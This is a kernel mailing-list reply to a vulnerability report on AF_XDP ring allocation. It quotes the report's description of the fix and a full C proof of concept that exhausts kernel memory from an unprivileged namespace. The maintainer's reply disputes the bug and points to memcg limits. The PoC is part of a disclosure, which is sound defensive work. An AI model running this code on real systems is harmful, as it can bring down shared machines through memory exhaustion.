Received: from mail-pj2-f9.google.com (mail-pj2-f9.google.com [74.125.227.137])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DC9404C954A
	for <bpf@vger.kernel.org>; Wed, 29 Jul 2026 16:38:46 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.137
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785343130; cv=none; b=HnygwN9YDNgNJ+1fjHZZtPQoeAi3oB4HnLrQeQy8xJ/tPkFsRdh2Rk/TgMUfd2PDX6YvpBYUQZjqN45tz0MCez9rl5E6njhHM6KW7jZPKmhWdlr6jHtUP1kiHX49CocGo1nJbh0NgOc2Kg+rzhS1jZcL7AGk3a9oUWr9sXM0Yvo=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785343130; c=relaxed/simple;
	bh=o0NSRCyiPXXgriEdOwt8eGcwXFo+fSB818rHUmF8Oak=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=Z4wl4iDEZm7Td8KxVIUs+R6bfXwvqqmuMmMO9pO4wuHWXDKLs5TbjALZGyfLGSP9aTmK1d60RmbeC1zR2FTio9PCtYxV6QVmNN1Xda7dHpgPbUkOQ/9hC77dm8WxAiU5sWZUmns8+f6BdmYDBhpX2iWD4TcyW4E/XU1jTtULRdU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=qx2ziNkF; arc=none smtp.client-ip=74.125.227.137
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="qx2ziNkF"
Received: by mail-pj2-f9.google.com with SMTP id 98e67ed59e1d1-38eca9b7114so544491a91.1
        for <bpf@vger.kernel.org>; Wed, 29 Jul 2026 09:38:46 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785343124; x=1785947924; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:content-type:mime-version
         :references:message-id:subject:cc:to:from:date:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=5qSxttMWa0mJscjM1mfb0RauUUayXTalCzLP7th5DS4=;
        b=qx2ziNkFgEyhf+BdxRI+f6g4aM9j0FvyAP5t7R1HDY01U3NgcNKLKr/nRi8I3jnOZd
         Bewj2SBMFlKMT39rqkGy2UWHyROsCF3Da3vFj/pmYNC+3XFtPj54xTiOAVLuw/Gp/Nd/
         N4XI2Vu0wKay17C43hdxBpNEpxJtFrLe1AfdhReCPHMP7cRawNXBhin3+w9I7N9dbqgW
         mKWlCBAydJI8wa7YZuXiNDItOmhdgTvmRjGnoaTvk6dCDZR2P5gUvc1pF6trPPOL/OqU
         IbnyqUte7JznkOrEhJKbrUnjx4aRgzG9TZa/at4GpS3YghMUEHLUeONgw+QpFWvMwIBJ
         efSQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785343124; x=1785947924;
        h=in-reply-to:content-disposition:content-type:mime-version
         :references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=5qSxttMWa0mJscjM1mfb0RauUUayXTalCzLP7th5DS4=;
        b=UErZ4A7sXKQkn/ar0MBH9QbhbUdFAjh62uGlhe3r6ntlHwimNQNNPiXSS3z0cTP+FP
         Iz8RkNfmsLtEUavA5Ijs1eAMj+DHYx5/6ERNY/c6Un5AKdAcaJdvYtEV1wmCDIcRXJt3
         j+m6zH6DHhmfewyMvvdpcMp2aOe+Wh9kOQKrrWHrWcvjURUlegUZBYQWmzxvLSwrQVyh
         OxjdVFS09fHBls8y636eglZDgysuZwnNiRt1EyUJv7ageGo9Mzmo746l54Ggyq8Sc4bk
         fOnPFUkbszueEFHZ5d04v+ON3/amksfL/i+y94BTGUGwx5/eBZ7MYc/hTtxYhMy2oOVd
         +7WQ==
X-Forwarded-Encrypted: i=1; AHgh+RoW+1viQ2e7R3W6H3PfO3mZtRx3ujU9bCeu99DzNOF+CbLE/YvybR1p7SVnS/+hYToy0C4=@vger.kernel.org
X-Gm-Message-State: AOJu0Yyh6BjbyoF2a02rsPuHcCuujlEpwexOGF276kNsnQgFoi3Cgd7k
	Yv+XwOhpR1D9KOIExie6ddbnCxGQJqKyNlo2MpSc8czu+aSLx3X7eDyV
X-Gm-Gg: AR+sD11d4Dlj9Rb8GDl6HEWV9VMjc3CBZIQf7p19b/U/eDnc/FaS+CJa+KhTTMxR2TD
	efrwgWpNNW/FYPjm0WQ0sIe2Tenv1/YLmFppC4sAifXhb4aMmz4D8TcweF0Vq/02s+H1SquUVY2
	DyTISGJVJU8RbHukdzWhQ2RCH6i+GRv6lLXfb+SAZhKsVR9x6ijr1fNIiw+/UTxwtBEl+ByyKa2
	AU86sWnqsSvZ/vohX06RedV1jMgTmEjdS0xVqw93JNU0KqHltQYeDoVxTI0UFkTjsIzdLS/JVOE
	CpAmDF3sWedIuWpUUHpQmBNivXckLYEDP0ZLEgI/D4MXHBsHii/9/IkIDPIDCV/EH2Oy1TXcM3g
	hzWUqiYztmAjlDmA9HDtzkXbzcx7GR/7Zq6rww0rOc+PyVbiVrkkW2MndcGWWVTpTOgtkMUxARK
	IuSsly7FVEkDB42bTdayLy08emDwmnYc6GIbQk3Zh2f03babIk1yMTtQQ/6pwCyn3krA==
X-Received: by 2002:a17:90b:1645:b0:387:e0bb:57f8 with SMTP id 98e67ed59e1d1-38f6a4d6731mr7361780a91.41.1785343124501;
        Wed, 29 Jul 2026 09:38:44 -0700 (PDT)
Received: from localhost ([2a03:2880:9ff:72::])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-31504cc9dffsm12785644eec.14.2026.07.29.09.38.43
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 29 Jul 2026 09:38:43 -0700 (PDT)
Date: Wed, 29 Jul 2026 09:37:54 -0700
From: Stanislav Fomichev <sdf.kernel@gmail.com>
To: Zihan Xi <zihanx@nebusec.ai>
Cc: netdev@vger.kernel.org, bpf@vger.kernel.org, magnus.karlsson@intel.com,
	maciej.fijalkowski@intel.com, sdf@fomichev.me, davem@davemloft.net,
	edumazet@google.com, pabeni@redhat.com, horms@kernel.org,
	ast@kernel.org, daniel@iogearbox.net, hawk@kernel.org,
	john.fastabend@gmail.com, vega@nebusec.ai
Subject: Re: [PATCH net 0/1] xsk: prevent AF_XDP ring resource exhaustion
Message-ID: <amosYv8kWGJmmOHV@devvm16445.scu0.facebook.com>
References: <cover.1785313094.git.zihanx@nebusec.ai>
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
In-Reply-To: <cover.1785313094.git.zihanx@nebusec.ai>

On 07/29, Zihan Xi wrote:
> Hi Linux kernel maintainers,
> 
> We found and validated a issue in net/xdp/xsk_queue.c. The bug is reachable by a
> non-root user via user and net namespace.
> We've tested it, and it should not affect any other functionality.
> 
> We will provide detailed information about the bug
> in this email, along with a PoC to trigger it.
> 
> ---- details below ----
> 
> Bug details:
> 
> AF_XDP sockets allow user space to allocate RX, TX, UMEM fill and UMEM
> completion rings with setsockopt().  xskq_create() only validates that the
> entry count is non-zero and a power of two before computing the ring size and
> calling vmalloc_user().  The allocation is not charged against the socket
> optmem limit.  The underlying root cause dates back to the original shared
> xskq_create() helper used for UMEM fill rings, while later RX-ring support and
> the vmalloc-based ring allocation path only made the same bug easier to reach
> and more effective at pinning memory before bind or packet I/O.
> 
> The fix charges the page-aligned ring size to sk_omem_alloc before the
> vmalloc_user() call and bounds the charge by the namespace optmem limit.  The
> charge path uses an atomic cmpxchg loop, rather than adding first and rolling
> back later, so concurrent allocations cannot race past the limit and the
> signed sk_omem_alloc counter cannot overflow and wrap below the limit.
> 
> UMEM fill and completion queues can move from the socket to the AF_XDP buffer
> pool and be destroyed after socket release.  The queue therefore keeps a
> socket reference for safe uncharging.  To avoid a release cycle where the
> queue reference prevents the socket destructor that used to release the pool,
> the socket now drops its pool and UMEM references from xsk_release() before
> the final socket put; xsk_destruct() keeps the same helper as a fallback.
> 
> This reproducer does not use packetdrill because the trigger is the AF_XDP
> setsockopt() ring allocation path, not a packet sequence or protocol state
> transition that packetdrill can express.
> 
> Reproducer:
> 
>     gcc -O2 -static -o poc poc.c
>     unshare -Urn ./poc
> 
> We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
> 
> ------BEGIN poc.c------
> #define _GNU_SOURCE
> #include <errno.h>
> #include <linux/if_xdp.h>
> #include <netinet/in.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/resource.h>
> #include <sys/socket.h>
> #include <sys/sysinfo.h>
> #include <unistd.h>
> 
> static void print_meminfo(const char *tag)
> {
> 	struct sysinfo info;
> 
> 	if (sysinfo(&info) == 0) {
> 		unsigned long long total = (unsigned long long)info.totalram * info.mem_unit;
> 		unsigned long long free = (unsigned long long)info.freeram * info.mem_unit;
> 		unsigned long long avail = (unsigned long long)info.bufferram * info.mem_unit;
> 
> 		fprintf(stderr,
> 			"%s: total=%llu MiB free=%llu MiB buff=%llu MiB\n",
> 			tag, total >> 20, free >> 20, avail >> 20);
> 	}
> }
> 
> static int set_ring(int fd, int optname, unsigned int entries, const char *name)
> {
> 	int ret;
> 
> 	ret = setsockopt(fd, SOL_XDP, optname, &entries, sizeof(entries));
> 	if (ret) {
> 		fprintf(stderr, "setsockopt(%s, %u) failed: %s\n",
> 			name, entries, strerror(errno));
> 		return -1;
> 	}
> 
> 	fprintf(stderr, "allocated %s ring with %u entries on fd=%d\n",
> 		name, entries, fd);
> 	return 0;
> }
> 
> int main(int argc, char **argv)
> {
> 	static const struct {
> 		int optname;
> 		const char *name;
> 	} rings[] = {
> 		{ XDP_RX_RING, "XDP_RX_RING" },
> 		{ XDP_TX_RING, "XDP_TX_RING" },
> 		{ XDP_UMEM_FILL_RING, "XDP_UMEM_FILL_RING" },
> 		{ XDP_UMEM_COMPLETION_RING, "XDP_UMEM_COMPLETION_RING" },
> 	};
> 	unsigned int entries = 1U << 25;
> 	int nsockets = 8;
> 	int *fds;
> 	int i, j;
> 
> 	if (argc > 1)
> 		entries = strtoul(argv[1], NULL, 0);
> 	if (argc > 2)
> 		nsockets = atoi(argv[2]);
> 	if (!entries || !nsockets) {
> 		fprintf(stderr, "usage: %s [entries power-of-two] [socket_count]\n",
> 			argv[0]);
> 		return 1;
> 	}
> 
> 	fds = calloc(nsockets, sizeof(*fds));
> 	if (!fds) {
> 		perror("calloc");
> 		return 1;
> 	}
> 
> 	fprintf(stderr,
> 		"AF_XDP ring exhaustion PoC: entries=%u sockets=%d pid=%d\n",
> 		entries, nsockets, getpid());
> 	print_meminfo("before");
> 
> 	for (i = 0; i < nsockets; i++) {
> 		fds[i] = socket(AF_XDP, SOCK_RAW, 0);
> 		if (fds[i] < 0) {
> 			fprintf(stderr, "socket(AF_XDP) failed at index %d: %s\n",
> 				i, strerror(errno));
> 			break;
> 		}
> 
> 		fprintf(stderr, "opened AF_XDP socket %d fd=%d\n", i, fds[i]);
> 		for (j = 0; j < (int)(sizeof(rings) / sizeof(rings[0])); j++) {
> 			if (set_ring(fds[i], rings[j].optname, entries, rings[j].name))
> 				goto out;
> 			print_meminfo(rings[j].name);
> 		}
> 	}
> 
> out:
> 	fprintf(stderr, "holding allocations open; press Ctrl-C or wait\n");
> 	sleep(600);
> 
> 	for (i = 0; i < nsockets; i++) {
> 		if (fds[i] >= 0)
> 			close(fds[i]);
> 	}
> 	free(fds);
> 	return 0;
> }
> ------END poc.c--------
> 
> ----BEGIN crash log----

[..]

> [  112.547501][  T953] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled

Isn't it all working as intended? The userspace requests too much, we hit oom.
Since you seem to have "system-wide panic_on_oom is enabled" your kernel
panics.

I also looked at the fix and a bit confused about why you picked sysctl_optmem_max
as a limit. I believe there are better mechanisms (memcg) to limit these
types of allocations? (and they work by default, no need for any code
changes)
